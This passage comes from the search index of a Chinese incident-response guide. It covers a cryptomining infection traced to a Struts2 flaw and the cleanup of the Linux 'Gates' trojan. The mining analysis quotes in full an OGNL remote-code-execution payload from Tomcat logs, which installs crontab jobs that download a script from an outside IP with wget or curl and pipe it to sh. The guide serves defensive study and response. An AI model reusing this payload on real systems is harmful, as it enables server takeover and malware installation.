\u5e94\u6025\u573a\u666f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/#0x02-\u4e8b\u4ef6\u5206\u6790","text":"","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/#a\u6392\u67e5\u8fc7\u7a0b","text":"\u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u4e0b\u8f7dlogo.jpg\uff0c\u5305\u542b\u811a\u672c\u5185\u5bb9\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u4e0b\u8f7dlogo.jpg\u5e76\u6267\u884c\u4e86\u91cc\u9762\u4e86shell\u811a\u672c\uff0c\u90a3\u8fd9\u4e2a\u811a\u672c\u662f\u5982\u4f55\u542f\u52a8\u7684\u5462\uff1f \u901a\u8fc7\u6392\u67e5\u7cfb\u7edf\u5f00\u673a\u542f\u52a8\u9879\u3001\u5b9a\u65f6\u4efb\u52a1\u3001\u670d\u52a1\u7b49\uff0c\u5728\u5b9a\u65f6\u4efb\u52a1\u91cc\u9762\uff0c\u53d1\u73b0\u4e86\u6076\u610f\u811a\u672c\uff0c\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u8d77\u8bf7\u6c42\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff0c\u5e76\u6267\u884c \u3002","title":"A\u3001\u6392\u67e5\u8fc7\u7a0b"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/#b\u6eaf\u6e90\u5206\u6790","text":"\u200b \u5728Tomcat log\u65e5\u5fd7\u4e2d\uff0c\u6211\u4eec\u627e\u5230\u8fd9\u6837\u4e00\u6761\u8bb0\u5f55\uff1a \u5bf9\u65e5\u5fd7\u4e2d\u653b\u51fb\u6e90\u7801\u8fdb\u884c\u6458\u5f55\u5982\u4e0b\uff1a {(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo \"*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh\" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u4ee3\u7801\u4e2d\u7684\u64cd\u4f5c\u4e0e\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5f02\u5e38\u811a\u672c\u4e00\u81f4\uff0c\u636e\u6b64\u63a8\u65ad\u9ed1\u5ba2\u901a\u8fc7Struct \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5411\u670d\u52a1\u5668\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5199\u5165\u6076\u610f\u811a\u672c\u5e76\u6267\u884c\u3002","title":"B\u3001\u6eaf\u6e90\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/#c\u6e05\u9664\u75c5\u6bd2","text":"1\u3001\u5220\u9664\u5b9a\u65f6\u4efb\u52a1: 2\u3001\u7ec8\u6b62\u5f02\u5e38\u8fdb\u7a0b:","title":"C\u3001\u6e05\u9664\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/#d\u6f0f\u6d1e\u4fee\u590d","text":"\u200b \u5347\u7ea7struts\u5230\u6700\u65b0\u7248\u672c","title":"D\u3001\u6f0f\u6d1e\u4fee\u590d"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/#0x03-\u9632\u8303\u63aa\u65bd","text":"\u200b \u9488\u5bf9\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6","title":"0x03 \u9632\u8303\u63aa\u65bd"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC/","text":"\u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c \u00b6 0x00 \u524d\u8a00 \u00b6 \u200b Linux\u76d6\u8328\u6728\u9a6c\u662f\u4e00\u7c7b\u6709\u7740\u4e30\u5bcc\u5386\u53f2\uff0c\u9690\u85cf\u624b\u6cd5\u5de7\u5999\uff0c\u7f51\u7edc\u653b\u51fb\u884c\u4e3a\u663e\u8457\u7684DDoS\u6728\u9a6c\uff0c\u4e3b\u8981\u6076\u610f\u7279\u70b9\u662f\u5177\u5907\u4e86\u540e\u95e8\u7a0b\u5e8f\uff0cDDoS\u653b\u51fb\u7684\u80fd\u529b\uff0c\u5e76\u4e14\u4f1a\u66ff\u6362\u5e38\u7528\u7684\u7cfb\u7edf\u6587\u4ef6\u8fdb\u884c\u4f2a\u88c5\u3002\u6728\u9a6c\u5f97\u540d\u4e8e\u5176\u5728\u53d8\u91cf\u51fd\u6570\u7684\u547d\u540d\u4e2d\uff0c\u5927\u91cf\u4f7f\u7528Gates\u8fd9\u4e2a\u5355\u8bcd\u3002\u5206\u6790\u548c\u6e05\u9664\u76d6\u8328\u6728\u9a6c\u7684\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u5f88\u591a\u503c\u5f97\u53bb\u5b66\u4e60\u548c\u501f\u9274\u7684\u5730\u65b9\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u200b \u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u53d1\u73b0\u670d\u52a1\u5668CPU\u8d44\u6e90\u5f02\u5e38\uff0c\u51e0\u4e2a\u5f02\u5e38\u8fdb\u7a0b\u5360\u7528\u5927\u91cf\u7f51\u7edc\u5e26\u5bbd\uff1a 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 \u5f02\u5e38IP\u8fde\u63a5\uff1a \u5f02\u5e38\u8fdb\u7a0b\uff1a \u200b \u67e5\u770b\u8fdb\u884c\u53d1\u73b0ps aux\u8fdb\u7a0b\u5f02\u5e38\uff0c\u8fdb\u5165\u8be5\u76ee\u5f55\u53d1\u73b0\u591a\u4e2a\u547d\u4ee4\uff0c\u731c\u6d4b\u547d\u4ee4\u53ef\u80fd\u5df2\u88ab\u66ff\u6362 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u5f02\u5e38\u542f\u52a8\u9879 \u8fdb\u5165rc3.d\u76ee\u5f55\u53ef\u4ee5\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u884c\uff1a /etc/rc.d/rc3.d/S97DbSecuritySpt /etc/rc.d/rc3.d/S99selinux \u641c\u7d22\u75c5\u6bd2\u539f\u4f53 find / -size -1223124c -size +1223122c -exec ls -id {} \\; \u641c\u7d221223123\u5927\u5c0f\u7684\u6587\u4ef6 \u4ece\u4ee5\u4e0a\u79cd\u79cd\u884c\u4e3a\u53d1\u73b0\u8be5\u75c5\u6bd2\u4e0e\u201c\u76d6\u8328\u6728\u9a6c\u201d\u6709\u70b9\u7c7b\u4f3c\uff0c\u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.freebuf.com/articles/system/117823.html \u60ac\u955c\u670d\u52a1\u5668\u536b\u58eb\u4e28Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.sohu.com/a/117926079_515168 \u624b\u52a8\u6e05\u9664\u6728\u9a6c\u8fc7\u7a0b\uff1a 1\u3001\u7b80\u5355\u5224\u65ad\u6709\u65e0\u6728\u9a6c #\u6709\u65e0\u4e0b\u5217\u6587\u4ef6 cat /etc/rc.d/init.d/selinux cat /etc/rc.d/init.d/DbSecuritySpt ls /usr/bin/bsd-port ls /usr/bin/dpkgd #\u67e5\u770b\u5927\u5c0f\u662f\u5426\u6b63\u5e38 ls -lh /bin/netstat ls -lh /bin/ps ls -lh /usr/sbin/lsof ls -lh /usr/sbin/ss 2\u3001\u4e0a\u4f20\u5982\u4e0b\u547d\u4ee4\u5230/root\u4e0b ps netstat ss lsof 3\u3001\u5220\u9664\u5982\u4e0b\u76ee\u5f55\u53ca\u6587\u4ef6 rm -rf /usr/bin/dpkgd (ps netstat lsof ss) rm -rf /usr/bin/bsd-port #\u6728\u9a6c\u7a0b\u5e8f rm -f /usr/bin/.sshd #\u6728\u9a6c\u540e\u95e8 rm -f /tmp/gates.lod rm -f /tmp/moni.lod rm -f /etc/rc.d/init.d/DbSecuritySpt(\u542f\u52a8\u4e0a\u8ff0\u63cf\u8ff0\u7684\u90a3\u4e9b\u6728\u9a6c\u53d8\u79cd\u7a0b\u5e8f) rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt rm -f /etc/rc.d/init.d/selinux(\u9ed8\u8ba4\u662f\u542f\u52a8/usr/bin/bsd-port/getty) rm -f /etc/rc.d/rc1.d/S99selinux rm -f /etc/rc.d/rc2.d/S99selinux rm -f /etc/rc.d/rc3.d/S99selinux rm -f /etc/rc.d/rc4.d/S99selinux rm -f /etc/rc.d/rc5.d/S99selinux 4\u3001\u627e\u51fa\u5f02\u5e38\u7a0b\u5e8f\u5e76\u6740\u6b7b 5\u3001\u5220\u9664\u542b\u6728\u9a6c\u547d\u4ee4\u5e76\u91cd\u65b0\u5b89\u88c5 0x03 \u547d\u4ee4\u66ff\u6362 \u00b6 RPM check\u68c0\u67e5\uff1a \u7cfb\u7edf\u5b8c\u6574\u6027\u4e5f\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305,\u6709\u54ea\u4e9b\u88ab\u7be1\u6539\u4e86,\u9632\u6b62rpm\u4e5f\u88ab\u66ff\u6362,\u4e0a\u4f20\u4e00\u4e2a\u5b89\u5168\u5e72\u51c0\u7a33\u5b9a\u7248\u672crpm\u4e8c\u8fdb\u5236\u5230\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u68c0\u67e5 ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\u3002\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\u3002\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32, ``c \u7528\u4ee5\u6307\u914d\u7f6e\u6587\u4ef6, \u63a5\u7740\u662f\u6587\u4ef6\u540d. 8\u4f4d\u5b57\u7b26\u7684\u6bcf\u4e00\u4e2a \u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \u3002``. (\u70b9) \u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002.\u4e0b\u9762\u7684\u5b57\u7b26\u8868\u793a\u5bf9RPM\u8f6f\u4ef6\u5305\u8fdb\u884c\u7684\u67d0\u79cd\u6d4b\u8bd5\u5931\u8d25\uff1a \u547d\u4ee4\u66ff\u6362\uff1a rpm2cpio \u5305\u5168\u540d | cpio -idv .\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84 rpm\u5305\u4e2d\u6587\u4ef6\u63d0\u53d6 Rpm2cpio \u5c06rpm\u5305\u8f6c\u6362\u4e3acpio\u683c\u5f0f\u7684\u547d\u4ee4 Cpio \u662f\u4e00\u4e2a\u6807\u51c6\u5de5\u5177\uff0c\u5b83\u7528\u4e8e\u521b\u5efa\u8f6f\u4ef6\u6863\u6848\u6587\u4ef6\u548c\u4ece\u6863\u6848\u6587\u4ef6\u4e2d\u63d0\u53d6\u6587\u4ef6 Cpio \u9009\u9879 < [\u6587\u4ef6|\u8bbe\u5907] -i\uff1acopy-in\u6a21\u5f0f\uff0c\u8fd8\u539f -d\uff1a\u8fd8\u539f\u65f6\u81ea\u52a8\u65b0\u5efa\u76ee\u5f55 -v\uff1a\u663e\u793a\u8fd8\u539f\u8fc7\u7a0b \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2ls\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6rpm\u5305\u4e2dls\u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684/bin/ls\u4e0b cp /root/bin/ls /bin/ \u628als\u547d\u4ee4\u590d\u5236\u5230/bin/\u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931 \u6302\u8f7d\u547d\u4ee4rpm\u5305\uff1a mkdir /mnt/chrom/ \u5efa\u7acb\u6302\u8f7d\u70b9 mount -t iso9660 /dev/cdrom /mnt/cdrom/ \u6302\u5728\u5149\u76d8 mount/dev/sr0 /mnt/cdrom/ \u5378\u8f7d\u547d\u4ee4 umount \u8bbe\u5907\u6587\u4ef6\u540d\u6216\u6302\u8f7d\u70b9 umount /mnt/cdrom/","title":"\u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC/#\u7b2c4\u7bc7\u76d6\u8328\u6728\u9a6c","text":"","title":"\u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC/#0x00-\u524d\u8a00","text":"\u200b Linux\u76d6\u8328\u6728\u9a6c\u662f\u4e00\u7c7b\u6709\u7740\u4e30\u5bcc\u5386\u53f2\uff0c\u9690\u85cf\u624b\u6cd5\u5de7\u5999\uff0c\u7f51\u7edc\u653b\u51fb\u884c\u4e3a\u663e\u8457\u7684DDoS\u6728\u9a6c\uff0c\u4e3b\u8981\u6076\u610f\u7279\u70b9\u662f\u5177\u5907\u4e86\u540e\u95e8\u7a0b\u5e8f\uff0cDDoS\u653b\u51fb\u7684\u80fd\u529b\uff0c\u5e76\u4e14\u4f1a\u66ff\u6362\u5e38\u7528\u7684\u7cfb\u7edf\u6587\u4ef6\u8fdb\u884c\u4f2a\u88c5\u3002\u6728\u9a6c\u5f97\u540d\u4e8e\u5176\u5728\u53d8\u91cf\u51fd\u6570\u7684\u547d\u540d\u4e2d\uff0c\u5927\u91cf\u4f7f\u7528Gates\u8fd9\u4e2a\u5355\u8bcd\u3002\u5206\u6790\u548c\u6e05\u9664\u76d6\u8328\u6728\u9a6c\u7684\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u5f88\u591a\u503c\u5f97\u53bb\u5b66\u4e60\u548c\u501f\u9274\u7684\u5730\u65b9\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC/#0x01-\u5e94\u6025\u573a\u666f","text":"\u200b \u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u53d1\u73b0\u670d\u52a1\u5668CPU\u8d44\u6e90\u5f02\u5e38\uff0c\u51e0\u4e2a\u5f02\u5e38\u8fdb\u7a0b\u5360\u7528\u5927\u91cf\u7f51\u7edc\u5e26\u5bbd\uff1a","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC/#0x02-\u4e8b\u4ef6\u5206\u6790","text":"\u5f02\u5e38IP\u8fde\u63a5\uff1a \u5f02\u5e38\u8fdb\u7a0b\uff1a \u200b \u67e5\u770b\u8fdb\u884c\u53d1\u73b0ps aux\u8fdb\u7a0b\u5f02\u5e38\uff0c\u8fdb\u5165\u8be5\u76ee\u5f55\u53d1\u73b0\u591a\u4e2a\u547d\u4ee4\uff0c\u731c\u6d4b\u547d\u4ee4\u53ef\u80fd\u5df2\u88ab\u66ff\u6362 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u5f02\u5e38\u542f\u52a8\u9879 \u8fdb\u5165rc3.d\u76ee\u5f55\u53ef\u4ee5\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u884c\uff1a /etc/rc.d/rc3.d/S97DbSecuritySpt /etc/rc.d/rc3.d/S99selinux \u641c\u7d22\u75c5\u6bd2\u539f\u4f53 find / -size -1223124c -size +1223122c -exec ls -id {} \\; \u641c\u7d221223123\u5927\u5c0f\u7684\u6587\u4ef6 \u4ece\u4ee5\u4e0a\u79cd\u79cd\u884c\u4e3a\u53d1\u73b0\u8be5\u75c5\u6bd2\u4e0e\u201c\u76d6\u8328\u6728\u9a6c\u201d\u6709\u70b9\u7c7b\u4f3c\uff0c\u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.freebuf.com/articles/system/117823.html \u60ac\u955c\u670d\u52a1\u5668\u536b\u58eb\u4e28Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.sohu.com/a/117926079_515168 \u624b\u52a8\u6e05\u9664\u6728\u9a6c\u8fc7\u7a0b\uff1a 1\u3001\u7b80\u5355\u5224\u65ad\u6709\u65e0\u6728\u9a6c #\u6709\u65e0\u4e0b\u5217\u6587\u4ef6 cat /etc/rc.d/init.d/selinux cat /etc/rc.d/init.d/DbSecuritySpt ls /usr/bin/bsd-port ls /usr/bin/dpkgd #\u67e5\u770b\u5927\u5c0f\u662f\u5426\u6b63\u5e38 ls -lh /bin/netstat ls -lh /bin/ps ls -lh /usr/sbin/lsof ls -lh /usr/sbin/ss 2\u3001\u4e0a\u4f20\u5982\u4e0b\u547d\u4ee4\u5230/root\u4e0b ps netstat ss lsof 3\u3001\u5220\u9664\u5982\u4e0b\u76ee\u5f55\u53ca\u6587\u4ef6 rm -rf /usr/bin/dpkgd (ps netstat lsof ss) rm -rf /usr/bin/bsd-port #\u6728\u9a6c\u7a0b\u5e8f rm -f /usr/bin/.sshd #\u6728\u9a6c\u540e\u95e8 rm -f /tmp/gates.lod rm -f /tmp/moni.lod rm -f /etc/rc.d/init.d/DbSecuritySpt(\u542f\u52a8\u4e0a\u8ff0\u63cf\u8ff0\u7684\u90a3\u4e9b\u6728\u9a6c\u53d8\u79cd\u7a0b\u5e8f) rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt rm -f /etc/rc.d/init.d/selinux(\u9ed8\u8ba4\u662f\u542f\u52a8/usr/bin/bsd-port/getty) rm -f /etc/rc.d/rc1.d/S99selinux rm -f /etc/rc.d/rc2.d/S99selinux rm -f /etc/rc.d/rc3.d/S99selinux rm -f /etc/rc.d/rc4.d/S99selinux rm -f /etc/rc.d/rc5.d/S99selinux 4\u3001\u627e\u51fa\u5f02\u5e38\u7a0b\u5e8f\u5e76\u6740\u6b7b 5\u3001\u5220\u9664\u542b\u6728\u9a6c\u547d\u4ee4\u5e76\u91cd\u65b0\u5b89\u88c5","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9A%E7%9B%96%E8%8C%A8%E6%9C%A8%E9%A9%AC/#0x03-\u547d\u4ee4\u66ff\u6362","text":"RPM check\u68c0\u67e5\uff1a \u7cfb\u7edf\u5b8c\u6574\u6027\u4e5f\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305,\u6709\u54ea\u4e9b\u88ab\u7be1\u6539\u4e86,\u9632\u6b62rpm\u4e5f\u88ab\u66ff\u6362,\u4e0a\u4f20\u4e00\u4e2a\u5b89\u5168\u5e72\u51c0\u7a33\u5b9a\u7248\u672crpm\u4e8c\u8fdb\u5236\u5230\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u68c0\u67e5 ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\u3002\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\u3002\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32, ``c \u7528\u4ee5\u6307\u914d\u7f6e\u6587\u4ef6, \u63a5\u7740\u662f\u6587\u4ef6\u540d. 8\u4f4d\u5b57\u7b26\u7684\u6bcf\u4e00\u4e2a \u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \u3002``. (\u70b9) \u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002.\u4e0b\u9762\u7684\u5b57\u7b26\u8868\u793a\u5bf9RPM\u8f6f\u4ef6\u5305\u8fdb\u884c\u7684\u67d0\u79cd\u6d4b\u8bd5\u5931\u8d25\uff1a \u547d\u4ee4\u66ff\u6362\uff1a rpm2cpio \u5305\u5168\u540d | cpio -idv .\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84 rpm\u5305\u4e2d\u6587\u4ef6\u63d0\u53d6 Rpm2cpio \u5c06rpm\u5305\u8f6c\u6362\u4e3acpio\u683c\u5f0f\u7684\u547d\u4ee4 Cpio \u662f\u4e00\u4e2a\u6807\u51c6\u5de5\u5177\uff0c\u5b83\u7528\u4e8e\u521b\u5efa\u8f6f\u4ef6\u6863\u6848\u6587\u4ef6\u548c\u4ece\u6863\u6848\u6587\u4ef6\u4e2d\u63d0\u53d6\u6587\u4ef6 Cpio \u9009\u9879 < [\u6587\u4ef6|\u8bbe\u5907] -i\uff1acopy-in\u6a21\u5f0f\uff0c\u8fd8\u539f -d\uff1a\u8fd8\u539f\u65f6\u81ea\u52a8\u65b0\u5efa\u76ee\u5f55 -v\uff1a\u663e\u793a\u8fd8\u539f\u8fc7\u7a0b \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2ls\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6rpm\u5305\u4e2dls\u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684/bin/ls\u4e0b cp /root/bin/ls /bin/ \u628als\u547d\u4ee4\u590d\u5236\u5230/bin/\u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931 \u6302\u8f7d\u547d\u4ee4rpm\u5305\uff1a mkdir /mnt/chrom/ \u5efa\u7acb\u6302\u8f7d\u70b9 mount -t iso9660 /dev/cdrom /mnt/cdrom/ \u6302\u5728\u5149\u76d8 mount/dev/sr0 /mnt/cdrom/ \u5378\u8f7d\u547d\u4ee4 umount \u8bbe\u5907\u6587\u4ef6\u540d\u6216\u6302\u8f7d\u70b9 umount /mnt/cdrom/","title":"0x03 \u547d\u4ee4\u66ff\u6362"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9ADDOS%E7%97%85%E6%AF%92/","text":"\u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2 \u00b6 \u73b0\u8c61\u63cf\u8ff0 \u00b6 